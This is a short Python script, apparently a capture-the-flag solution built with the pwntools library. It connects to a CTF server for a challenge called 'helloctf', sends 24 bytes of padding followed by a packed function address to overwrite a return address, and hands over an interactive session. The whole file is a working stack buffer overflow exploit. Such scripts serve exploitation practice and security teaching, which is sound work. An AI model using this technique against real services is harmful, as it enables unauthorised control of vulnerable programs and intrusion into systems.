from pwn import *

# p = process("./helloctf")
r = remote("ctf.adl.tw", 11001)

r.recv()
junk = 'a'*24
show_me_magic = 0x0000000000400627
payload = junk + p64(show_me_magic)
r.sendline(payload)

r.interactive()